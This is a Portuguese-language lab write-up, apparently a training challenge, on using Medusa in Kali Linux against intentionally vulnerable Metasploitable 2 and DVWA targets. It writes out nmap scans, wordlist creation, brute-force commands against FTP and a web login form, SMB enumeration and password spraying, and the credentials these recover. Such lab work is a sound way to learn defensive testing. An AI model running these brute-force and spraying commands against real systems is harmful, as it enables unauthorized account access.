O intuito do desafio aprender como utilizar a ferramenta Medusa disponível no Kali Linux, utilizando os ambientes Metasploitable 2 e DVWA.



Foram configurados os dois ambientes Kali Linux e Metasploitable 2 no VirtualBox com rede interna (host-only).



&nbsp;	**\* Está descrito na Captura1 e Captura2.**



Eu abri o Kali e digitei o comando:



	*ifconfig e apareceu o ip 192.168.56.101*



&nbsp;	**\* Está descrito na Captura3.**



Depois usei o comando *sudo nmap -sn 192.168.56.0/24.*



<b>	\* Está descrito na Captura4.</b>



Foi aí que apareceu por mais óbvio que o metasploitable 2 era o ip 192.168.56.102.



Depois foi utilizado o código *nmap -sV -p 21,22,80,445,139 192.168.56.102 onde foi descoberto o serviço FTP aberto.*



	***\* Está descrito na Captura5.***





Agora foi criado a lista de usuários e senhas com os comandos:



&nbsp;	*echo -e "user\\nmsfadmin\\nadmin\\nroot" > users.txt*

	*echo -e "123456\\npassword\\nqwerty\\nmsfadmin" > pass.txt*



	***\*Está descrito na Captura6***



Agora vai ser utilizado a ferramenta MEDUSA para fazer estratégia de Brute Force utilizando o comando:

	



	***medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6***





&nbsp;	**\*Está descrito na Captura7**





Foi aí que foi descoberto qual login e senha do servidor FTP.



Login: msfadmin	

Senha: msfadmin



Agora foi só logar no servidor FTP de acordo com a imagem concluindo a invasão via MEDUSA de Brute Force.





	***\*Está descrito na Captura8***



Agora o ataque a formulário web(DVWA), é só abrir o Kali Linux e abrir o navegador no endereço *192.168.56.102\\dvwa*



*lá foi descoberto como é a forma de login para ser explorado.*



	

	*<b>\*Está descrito na Captura9</b>*



*Agora vai ser criado as WORDLIST que serão utilizadas.*





	***\*Está descrito na Captura10***



*Agora o MEDUSA vai ser utilizado junto com as wordlists criadas para ver qual login e senha consegue êxito no login do site <b>DVWA </b>utilizando o comando*



	*medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \\*

*-m PAGE:'/dvwa/login.php' \\*

*-m FORM:'username=^USER^\&password=^PASS^\&Login=Login' \\*

*-m 'FAIL=Login failed' -t 6*



     ***\*Está na Captura11***





*Login: admin*

*Senha: password*



 ***\*Está na Captura12***

	



Agora vamos utilizar o **password spraying** em **SMB**	que é uma única senha (fraca) para vários usuários ao mesmo tempo.



Com o código a seguir é feita a enumeração do servidor SMB e é gravada a saída de tudo colhido pelo código.



&nbsp;	*enum4linux -a 192.168.56.102 | tee enum4\_output.txt* 



Após isso foram criados as wordlist de smb de usuários e senha 



&nbsp;	\****Está descrito na Captura13***



***Agora novamente a MEDUSA é utilizada para fazer o password spraying em SMB para achar um login e senha válido utilizando o código***



	***medusa -h 192.168.56.102 -U smb\_users.txt -P senhas\_spray.txt -M smbnt -t 2 -T 50*** 







<i>	**\*Está na Captura14**</i>





<i>**Onde foi encontrada uma vulnerabilidade no login:**</i>



<i>**usuário: msfadmin**			</i>

<i>**senha: msfadmin**</i>





<i>E utilizando o código smbclient -L \\\\192.168.56.102 -U msfadmin fpoi visto que foi invadido com sucesso.</i>





<i> 	**\*Está na Captura15**</i>





&nbsp;	

